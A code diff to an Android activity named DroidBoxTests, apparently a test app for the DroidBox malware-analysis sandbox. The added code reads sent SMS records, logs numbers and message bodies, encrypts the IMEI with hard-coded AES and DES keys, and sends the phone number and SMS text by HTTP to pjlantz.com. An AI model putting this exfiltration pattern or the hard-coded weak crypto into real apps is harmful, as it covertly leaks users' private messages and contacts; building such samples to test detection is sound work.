@@ -5,24 +5,27 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.spec.SecretKeySpec;
 import android.app.Activity;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import java.security.SecureRandom;
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.SecretKeySpec;
-
-
 public class DroidBoxTests extends Activity {
 	
 	private String imei, hashedImei;
-	private String encryptedImei;
+	private String encryptedImei, phoneNbr, msg;
+	private static final byte[] KEY = { 0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15 };
+	private static final byte[] KEY2 = { 0, 42, 2, 54, 4, 45, 6, 8 };
 	
     /** 
      * Called when the activity is first created. 
@@ -34,8 +37,10 @@ public class DroidBoxTests extends Activity {
         // Setup test variables
         this.setupTest();
         // Run tests
+        this.testSMSRead();
         this.testCryptHash();
         this.testCryptAES();
+        this.testCryptDES();
         this.testNetworkHTTP();
     }
     
@@ -45,15 +50,85 @@ public class DroidBoxTests extends Activity {
         imei = manager.getDeviceId();
     }
     
+    /**
+     * Read SMS history
+     */
+    public void testSMSRead() {
+    	Log.v("Test", "[*] testSMSRead()");
+    	String strUri = "content://sms/sent";
+    	Uri urisms = Uri.parse(strUri);
+    	Cursor c = this.getContentResolver().query(urisms, null, null, null, null);
+    	while (c.moveToNext()) {
+    		// Addr at column 2
+    		String addr = c.getString(2);
+    		phoneNbr = addr;
+    		Log.v("SMSinbox", "To: " + addr);
+    		// Msg body at column 11
+    		msg = c.getString(11);
+    		Log.v("SMSinbox", "Msg: " + msg);
+    	}
+    }
+    
+    /**
+     * Usage of AES encryption in crypto API
+     */
     public void testCryptAES() {
     	Log.v("Test", "[*] testCryptAES()");
-    	SimpleCrypto s = new SimpleCrypto();
-    	String crypto;
+    	
+        Cipher c;
 		try {
-			crypto = s.encrypt("password", imei);
-			encryptedImei = s.toHex(crypto.getBytes());
-			s.decrypt("password", crypto);
-		} catch (Exception e) {
+			c = Cipher.getInstance("AES");
+	        SecretKeySpec keySpec = new SecretKeySpec(KEY, "AES");
+	        c.init(Cipher.ENCRYPT_MODE, keySpec);
+	        byte[] data = imei.getBytes();
+	        byte[] enc = c.doFinal(data);
+            encryptedImei = this.toHex(enc);
+            
+            Cipher d = Cipher.getInstance("AES");
+            SecretKeySpec d_keySpec = new SecretKeySpec(KEY, "AES");
+            d.init(Cipher.DECRYPT_MODE, d_keySpec);
+            d.doFinal(enc);
+		} catch (NoSuchAlgorithmException e) {
+			e.printStackTrace();
+		} catch (NoSuchPaddingException e) {
+			e.printStackTrace();
+		} catch (InvalidKeyException e) {
+			e.printStackTrace();
+		} catch (IllegalBlockSizeException e) {
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
+			e.printStackTrace();
+		}
+    }
+    
+    /**
+     * Usage of DES encryption in crypto API
+     */
+    public void testCryptDES() {
+    	Log.v("Test", "[*] testCryptDES()");
+    	
+        Cipher c;
+		try {
+			c = Cipher.getInstance("DES");
+	        SecretKeySpec keySpec = new SecretKeySpec(KEY2, "DES");
+	        c.init(Cipher.ENCRYPT_MODE, keySpec);
+	        byte[] data = imei.getBytes();
+	        byte[] enc = c.doFinal(data);
+            encryptedImei = this.toHex(enc);
+            
+            Cipher d = Cipher.getInstance("DES");
+            SecretKeySpec d_keySpec = new SecretKeySpec(KEY2, "DES");
+            d.init(Cipher.DECRYPT_MODE, d_keySpec);
+            d.doFinal(enc);
+		} catch (NoSuchAlgorithmException e) {
+			e.printStackTrace();
+		} catch (NoSuchPaddingException e) {
+			e.printStackTrace();
+		} catch (InvalidKeyException e) {
+			e.printStackTrace();
+		} catch (IllegalBlockSizeException e) {
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
 			e.printStackTrace();
 		}
     }
@@ -83,16 +158,7 @@ public class DroidBoxTests extends Activity {
             digest = java.security.MessageDigest.getInstance("SHA1");
             digest.update(imei.getBytes());
             messageDigest = digest.digest();
-            
-            // Create Hex String
-            StringBuffer hexString = new StringBuffer();
-            for (int i = 0; i < messageDigest.length; i++) {
-                String h = Integer.toHexString(0xFF & messageDigest[i]);
-                while (h.length() < 2)
-                    h = "0" + h;
-                hexString.append(h);
-            }
-            hashedImei = hexString.toString();
+            hashedImei = this.toHex(messageDigest);
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         }
@@ -126,6 +192,18 @@ public class DroidBoxTests extends Activity {
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
             while ((line = rd.readLine()) != null);
+            
+            // HttpURLConnection sending phone number retrieved from sms db
+            url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
+            urlConnection = (HttpURLConnection) url.openConnection();
+            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+            while ((line = rd.readLine()) != null);
+            
+            // HttpURLConnection sending SMS message retrieved from db
+            url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
+            urlConnection = (HttpURLConnection) url.openConnection();
+            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+            while ((line = rd.readLine()) != null);
         } catch (IOException e) {
             e.printStackTrace();
         } finally {
@@ -133,69 +211,19 @@ public class DroidBoxTests extends Activity {
     	}
     }
     
-	    private class SimpleCrypto {
-	
-	        public String encrypt(String seed, String cleartext) throws Exception {
-                byte[] rawKey = getRawKey(seed.getBytes());
-                byte[] result = encrypt(rawKey, cleartext.getBytes());
-                return toHex(result);
-	        }
-	        
-	        public String decrypt(String seed, String encrypted) throws Exception {
-                byte[] rawKey = getRawKey(seed.getBytes());
-                byte[] enc = toByte(encrypted);
-                byte[] result = decrypt(rawKey, enc);
-                return new String(result);
-	        }
-	
-	        private byte[] getRawKey(byte[] seed) throws Exception {
-                KeyGenerator kgen = KeyGenerator.getInstance("AES");
-                SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
-                sr.setSeed(seed);
-	            kgen.init(128, sr); // 192 and 256 bits may not be available
-	            SecretKey skey = kgen.generateKey();
-	            byte[] raw = skey.getEncoded();
-	            return raw;
-	        }
-	
-	        
-	        private byte[] encrypt(byte[] raw, byte[] clear) throws Exception {
-	            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
-                Cipher cipher = Cipher.getInstance("AES");
-	            cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
-	            byte[] encrypted = cipher.doFinal(clear);
-                return encrypted;
-	        }
-	
-	        private byte[] decrypt(byte[] raw, byte[] encrypted) throws Exception {
-	            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
-                Cipher cipher = Cipher.getInstance("AES");
-	            cipher.init(Cipher.DECRYPT_MODE, skeySpec);
-	            byte[] decrypted = cipher.doFinal(encrypted);
-                return decrypted;
-	        }
-	        
-	        public byte[] toByte(String hexString) {
-                int len = hexString.length()/2;
-                byte[] result = new byte[len];
-                for (int i = 0; i < len; i++)
-                    result[i] = Integer.valueOf(hexString.substring(2*i, 2*i+2), 16).byteValue();
-                return result;
-	        }
-	
-	        public String toHex(byte[] buf) {
-                if (buf == null)
-                    return "";
-                StringBuffer result = new StringBuffer(2*buf.length);
-                for (int i = 0; i < buf.length; i++) {
-                    appendHex(result, buf[i]);
-                }
-                return result.toString();
-	        }
-	        private final static String HEX = "0123456789ABCDEF";
-	        private void appendHex(StringBuffer sb, byte b) {
-	            sb.append(HEX.charAt((b>>4)&0x0f)).append(HEX.charAt(b&0x0f));
-	        }
-	        
-	}
+    /**
+     * Returns Hex representation of a byte buffer
+     * @param buf Byte buffer
+     * @return String with hex representation
+     */
+    private String toHex(byte[] buf) {
+        StringBuffer hexString = new StringBuffer();
+        for (int i = 0; i < buf.length; i++) {
+            String h = Integer.toHexString(0xFF & buf[i]);
+            while (h.length() < 2)
+                h = "0" + h;
+            hexString.append(h);
+        }
+        return  hexString.toString();
+    }
 }
